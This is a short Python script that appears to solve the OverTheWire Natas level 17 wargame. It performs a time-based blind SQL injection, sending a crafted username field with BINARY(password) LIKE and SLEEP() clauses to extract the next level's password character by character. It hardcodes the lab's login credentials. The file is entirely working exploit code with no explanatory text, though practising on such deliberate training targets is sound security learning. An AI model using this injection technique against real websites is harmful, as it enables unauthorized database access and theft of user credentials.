from requests import request as req
from time import time


url = "http://natas17.natas.labs.overthewire.org/index.php"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")


def request(username: str):
    res = req(method="POST", url=url, auth=auth, data={"username": username})

    return res.text


def main():
    candidate = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    answer = ""
    while len(answer) != 32:
        for c in candidate:
            SLEEP = 3
            start = time()
            print(answer + c)
            request(
                f'natas18" AND BINARY(password) LIKE "{answer + c}%" AND SLEEP({SLEEP}) #'
            )
            end = time()

            duration = end - start

            if duration > SLEEP:
                answer += c
                break


main()
